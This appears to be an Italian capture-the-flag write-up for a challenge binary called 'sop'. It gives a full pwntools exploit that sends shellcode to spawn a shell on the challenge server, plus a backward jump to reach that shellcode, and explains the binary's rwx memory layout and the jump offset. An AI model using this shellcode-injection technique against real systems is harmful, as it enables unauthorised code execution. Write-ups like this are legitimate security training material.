```c
from pwn import *

elf = ELF("sop")

p = remote("sop.challs.cyberchallenge.it", 9247)
offset = 256

shellcode = asm(shellcraft.sh())

payload = shellcode
payload += b"A" * (offset - len(payload))
payload += b'\xe9\xfb\xfe\xff\xff'

p.send(payload)
p.interactive()
```

Analizzando il programma notiamo che viene creata una pagina di 4096 byte all’indirizzo 0x100000 con permessi rwx.

```c
mmap((void *)0x100000,4096,7,0x32,-1,0);
```

Poi mette all’indirizzo 0x100100 la funzione write_stdout

```c
memcpy((void *)0x100100,write_stdout,len_read);
```

E successivamente chiama la funzione read_stdin

```c
(*(code *)(len_write + 0x100100))(0x100000,266);
```

Lo spazio disponibile per il nostro input è solamente di 0x100 (256 byte).

La logica dell’exploit è questa:

1. carichiamo lo shellcode
2. aggiungiamo del padding per riempire fino a 256
3. mettiamo un jmp -261 per saltare all’inizio dello shellcode

261 perché l’istruzione di jmp occupa 5 byte.